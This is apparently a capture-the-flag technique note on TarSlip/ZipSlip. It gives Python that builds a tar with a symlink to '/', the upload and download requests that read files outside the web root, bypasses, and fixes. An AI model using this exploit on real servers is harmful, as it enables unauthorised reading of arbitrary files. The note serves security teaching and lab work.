---
id: archive-extract-symlink-traversal
category: WEB
tags: [tarslip, zipslip, symlink, tar, zip, extractall, path-traversal, arbitrary-file-read, archive, upload, send-file, follow-symlinks, directory-traversal]
tools: []
manuals: []
title: "Archive import (TarSlip/ZipSlip): symlink member escapes the extraction dir"
difficulty: medium
created: 2026-11-16
updated: 2026-11-16
related: [ssrf-lfi-filter-bypass, sqli-union-authbypass, error-handler-file-leak]
---

## How to recognize this pattern

- An endpoint that **imports/restores** a `.tar.gz`/`.zip` you upload, and a file browser/manager
  that lists and downloads paths. Stack is usually Flask/Node/PHP with a server-side "confine to
  `/app`" check.
- A textual path check (`os.path.abspath` + "must stay under ROOT") blocks plain `../` traversal in
  the download param — but the check validates the **link's location**, not its **target**.
- The extractor calls `tarfile.extractall()` / `zipfile.extractall()` with **no member filter**.

## Method

### 1. Confirm the textual confinement and its blind spot
```
GET /admin/download?path=../../flag.txt   -> 404  (abspath normalizes ../, stays under /app)
```
The flag lives **outside** the web root, so direct traversal is dead. But `os.scandir`/`send_file`
**dereference symlinks** (`is_dir(follow_symlinks=True)`, `send_file` follows), while the confinement
check only compares the symlink's own path (which *is* under ROOT).

### 2. Build a one-member archive whose entry is a symlink to `/`
```python
import tarfile, io
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode="w:gz") as t:
    info = tarfile.TarInfo("x")          # lands at ROOT/x
    info.type = tarfile.SYMTYPE
    info.linkname = "/"                   # -> filesystem root
    t.addfile(info)
open("exploit.tar.gz","wb").write(buf.getvalue())   # ~85 bytes
```

### 3. Upload, then read through the link
```
POST /admin/import        (carry the import form's CSRF)
GET  /admin?path=x        -> lists /  (reveals /flag.txt, entrypoint.sh, .dockerenv)
GET  /admin/download?path=x/flag.txt   -> send_file follows x -> / -> reads /flag.txt
```

## Gotchas

- The confinement bug is that it validates **where the link is**, not **where it points**. A real fix
  is `os.path.realpath` before serving, `safe_join`, or `extractall(filter="data")` (Python ≥3.12).
- A symlink to `/` is the most flexible (read anything the app user can); a symlink straight to
  `/flag.txt` also works if you already know the path.
- Keep the archive to a single member so the extractor can't choke on siblings; `mode="r:gz"` on the
  server means you must ship gzip.
- If extraction rejects absolute `linkname`, use a relative one (`../../../`) — the extractall still
  writes it and the download still follows it.
- ZipSlip is the same bug with `../` *member names* (no symlink needed) when the extractor joins paths
  naively; try both shapes.

## Cross-reference

- `ssrf-lfi-filter-bypass`: other roads to arbitrary file read.
- `sqli-union-authbypass`: often the login in front of the file manager is the first link in the chain.
